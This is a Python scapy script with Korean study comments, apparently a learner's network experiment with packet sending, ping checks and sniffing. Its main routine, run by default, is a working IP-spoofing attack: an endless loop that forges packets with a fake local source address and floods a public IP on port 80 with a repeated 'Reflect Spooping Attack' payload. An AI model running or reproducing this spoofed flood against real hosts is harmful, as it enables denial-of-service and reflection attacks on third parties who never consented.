try:
    from scapy.all import IP, TCP, sr1, ICMP, send, sniff, Raw, ARP
    from scapy.layers.inet import RandShort
    import logging

    logging.getLogger("scapy").setLevel(logging.CRITICAL)

    def send_packet():
        # ICMP 패킷 생성
        packet = IP(dst="192.168.123.160")/TCP(dport=8000) 
        print(packet)
        # * IP 함수를 이용하여 도착지로 보낼 패킷을 형성
        # * ex) IP / ICMP 192.168.123.160 >  echo-request 0
        response = sr1(packet)
        print(response.src) 
        print(response.ttl) # * 패킷이 일정시간 동안 얼마나 오랫동안 살아있을 수 있는지에 대한 기록
        # * 지금 여기서 NoneType Error -> 요청한 패킷에 대하여 돌아오는 값이 존재하지 않음

    destination = ['192.168.123.50']

    def check_ip_alive():
        for e in range(len(destination)):
            packet = IP(dst=destination[e])/ICMP()
            response = sr1(packet, timeout=1, verbose=0)
            if response:
                print(f"IP Address {destination[e]} is alive")
            else:
                print(f"IP Address {destination[e]} is downed")

    def packet_callback(packet):
        # try:
        #     if IP in packet:
        #         src = packet[TCP].src
        #         dst = packet[TCP].dst
        #         if Raw in packet and "Reflect Spoofing Attack" in packet[Raw].load.decode():
        #             print("\033[1m\033[92m" + "Source IP Address" + "\033[0m" + f" >> {src}" + "\033[1m\033[96m" + " Destination IP Address" + "\033[0m" + f" >> {dst}")
        #             print("\033[1m\033[93m" + "Message: " + "\033[0m" + packet[Raw].load.decode())
        # except Exception as e:
        #     print(e)

        print("\033[1m\033[96m" + "Source IP: " + "\033[0m" + packet[IP].src)
        print("\033[1m\033[96m" + "Destination IP: " + "\033[0m" + packet[IP].dst)


    def sniffing():
        sniff(filter="tcp and port 8000", prn=packet_callback)
        
    def spooping():
        count = 0
        sta = "192.168.123.50"
        des = "219.251.176.190"
        mes = "Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping AttackReflect Spooping Attack"
        st_port = RandShort()
        de_port = 80
        print("\033[1m\033[92m" + "Start Spooping" + "\033[0m")
        while True:
            packet = IP(src=sta,dst=des)/TCP(sport=st_port,dport=de_port)/mes
            detail = packet.show2(dump=True)
            st_ip = str(detail).split('\n')[11]
            des_ip = str(detail).split('\n')[12]
            print("\033[1m\033[92m" + "Source IP Address" + "\033[0m" + f" >> {str(st_ip).split('=')[1][1:]}" + "\033[1m\033[96m" + " Destination IP Address" + "\033[0m" + f" >> {str(des_ip).split('=')[1][1:]}" + "\033[1m\033[91m" + f" [{count}]...IP_SPOOPING" + "\033[0m")
            send(packet, verbose=0)
            count += 1
        # * send와 sr,sr1의 차이점 -> sr과 sr1은 패킷을 송신하고, 응답을 기다리지만, send는 x

    if __name__ == "__main__":
        # sniffing()
        spooping()
        # check_ip_alive()

except Exception as e:
    print("\033[1m\033[91m" + "Permission Error" + "\033[0m") 
    print(e)